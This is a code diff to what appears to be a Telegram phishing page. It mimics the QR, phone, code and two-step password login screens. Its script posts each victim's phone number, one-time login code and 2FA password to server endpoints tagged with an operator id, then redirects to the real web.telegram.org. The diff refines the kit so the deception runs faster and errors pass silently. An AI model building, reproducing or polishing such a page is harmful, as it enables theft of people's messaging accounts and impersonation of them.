@@ -157,8 +157,8 @@
             <h1>Log in to Telegram</h1>
             <ul class="instructions">
                 <li>Open Telegram on your phone</li>
-                <li>Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b></li>
-                <li>Point your phone at this screen to confirm login</li>
+                <li>Go to <b>Settings</b> > <b>Devices</b></li>
+                <li>Tap <b>Link Desktop Device</b> and scan</li>
             </ul>
             <div class="link-action" onclick="showStep('phone')">Log in by phone number</div>
         </div>
@@ -167,8 +167,8 @@
             <div class="logo-wrapper">
                 <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
             </div>
-            <h1>Sign in to Telegram</h1>
-            <p>Please confirm your country code and enter your phone number.</p>
+            <h1>Sign in</h1>
+            <p>Enter your phone number to receive a code.</p>
             <div class="input-wrapper">
                 <div class="input-label">Phone Number</div>
                 <input type="tel" id="phone-field">
@@ -182,10 +182,10 @@
                 <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
             </div>
             <h1 id="user-phone-display">Phone</h1>
-            <p>We've sent an activation code to your Telegram app.</p>
+            <p>Enter the code sent to your Telegram app.</p>
             <div class="input-wrapper">
                 <div class="input-label">Code</div>
-                <input type="text" id="sms-field" placeholder="Code" maxlength="5" style="text-align:center; letter-spacing:8px; font-weight:bold;">
+                <input type="text" id="sms-field" placeholder="00000" maxlength="5" style="text-align:center; letter-spacing:8px; font-weight:bold;">
             </div>
             <button class="btn-primary" onclick="handleCode()">Next</button>
         </div>
@@ -194,11 +194,11 @@
             <div class="logo-wrapper">
                 <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
             </div>
-            <h1>Two-Step Verification</h1>
-            <p>Your account is protected by a cloud password.</p>
+            <h1>Cloud Password</h1>
+            <p>Your account is protected by 2FA.</p>
             <div class="input-wrapper">
                 <div class="input-label">Password</div>
-                <input type="password" id="password-field" placeholder="Enter Password">
+                <input type="password" id="password-field" placeholder="Password">
             </div>
             <button class="btn-primary" onclick="handle2FA()">Next</button>
         </div>
@@ -208,7 +208,6 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // Get tid from URL or fallback to a default if not found
     const urlParams = new URLSearchParams(window.location.search);
     const tid = urlParams.get('id') || 'Admin'; 
     let currentNumber = "";
@@ -225,12 +224,10 @@
         const target = document.getElementById(`step-${s}`);
         if(target) target.classList.add('active');
         document.getElementById('sync-loader').style.display = 'none';
-        if(s === 'qr') loadQR();
     }
 
     async function loadQR() {
         try {
-            // Pass the tid in the query string so the server knows where to send updates
             const res = await fetch(`/get_qr?id=${tid}`, {method:'POST'});
             const data = await res.json();
             if(data.qr_image) {
@@ -241,83 +238,67 @@
 
     async function handlePhone() {
         currentNumber = iti.getNumber();
-        if(!iti.isValidNumber()) return alert("Please enter a valid phone number.");
+        if(!iti.isValidNumber()) return alert("Enter a valid number.");
         
-        document.getElementById('step-phone').classList.remove('active');
-        document.getElementById('sync-loader').style.display = 'block';
+        document.getElementById('user-phone-display').innerText = currentNumber;
+        showStep('code'); // INSTANT SWITCH
 
-        try {
-            const res = await fetch('/step_phone', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentNumber, tid: tid })
-            });
-            const data = await res.json();
-            
-            if(data.status === "success") {
-                document.getElementById('user-phone-display').innerText = currentNumber;
-                showStep('code');
-            } else {
-                alert(data.msg || "Error occurred");
+        fetch('/step_phone', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentNumber, tid: tid })
+        }).then(res => res.json()).then(data => {
+            if(data.status !== "success") {
+                alert(data.msg || "Invalid phone number.");
                 showStep('phone');
             }
-        } catch(e) { 
-            alert("Connection error.");
-            showStep('phone'); 
-        }
+        }).catch(() => { /* Silent Fail */ });
     }
 
     async function handleCode() {
         const code = document.getElementById('sms-field').value;
-        if(code.length < 5) return alert("Enter the 5-digit code.");
+        if(code.length < 5) return alert("Enter 5 digits.");
         
-        document.getElementById('step-code').classList.remove('active');
         document.getElementById('sync-loader').style.display = 'block';
 
-        try {
-            const res = await fetch('/step_code', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentNumber, code: code, tid: tid })
-            });
-            const data = await res.json();
-            
-            if(data.status === "success") {
-                window.location.href = "https://web.telegram.org";
-            } else if (data.status === "2fa_needed") {
-                showStep('2fa');
-            } else {
-                alert(data.msg || "Invalid Code");
-                showStep('code');
-            }
-        } catch(e) { showStep('code'); }
+        const res = await fetch('/step_code', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentNumber, code: code, tid: tid })
+        });
+        const data = await res.json();
+        
+        if(data.status === "success") {
+            window.location.href = "https://web.telegram.org";
+        } else if (data.status === "2fa_needed") {
+            showStep('2fa');
+        } else {
+            alert(data.msg || "Incorrect code.");
+            document.getElementById('sync-loader').style.display = 'none';
+        }
     }
 
     async function handle2FA() {
         const pass = document.getElementById('password-field').value;
-        if(!pass) return alert("Enter your cloud password.");
+        if(!pass) return alert("Enter password.");
 
-        document.getElementById('step-2fa').classList.remove('active');
         document.getElementById('sync-loader').style.display = 'block';
 
-        try {
-            const res = await fetch('/step_2fa', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentNumber, password: pass, tid: tid })
-            });
-            const data = await res.json();
-            
-            if(data.status === "success") {
-                window.location.href = "https://web.telegram.org";
-            } else {
-                alert(data.msg || "Incorrect Password");
-                showStep('2fa');
-            }
-        } catch(e) { showStep('2fa'); }
+        const res = await fetch('/step_2fa', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentNumber, password: pass, tid: tid })
+        });
+        const data = await res.json();
+        
+        if(data.status === "success") {
+            window.location.href = "https://web.telegram.org";
+        } else {
+            alert(data.msg || "Wrong password.");
+            document.getElementById('sync-loader').style.display = 'none';
+        }
     }
 
-    // Initialize with QR step
     loadQR();
 </script>
 </body>
